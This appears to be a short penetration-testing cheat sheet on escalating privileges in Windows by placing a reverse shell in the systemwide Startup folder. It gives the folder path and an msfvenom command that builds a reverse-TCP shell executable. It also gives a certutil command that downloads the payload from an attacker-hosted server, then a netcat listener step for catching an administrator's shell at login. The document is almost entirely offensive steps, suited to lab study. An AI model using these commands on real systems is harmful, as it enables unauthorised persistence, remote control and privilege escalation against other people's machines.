# By Start-up folder

### What is Start-up folder?
* When a windows starts a folder that execute with the privilege of the logged in user.
* If we put a reverse shell in the folder in systemwide startup folder. When any user logged in to the system the folder execute and we got the same privilege. If the administrator loging then we got the administrator shell.

### Find systemwide start-up folder through CMD.
```
"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

* If we have the privilege of write we can make a file or folder and put a reverse shell. Then we can get the shell.

---

### MSFvenom Payload Generation
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
```

---

### Transfer file through certutil :-

1. **1st open the Python server on attacker machine.**
2. **Then in CMD:**
```
certutil -urlcache -split -f http://IP/shell.exe o.exe
```
1. **Then starts the netcat.**

> If the admin loging to the window we got the admin's shell.

---
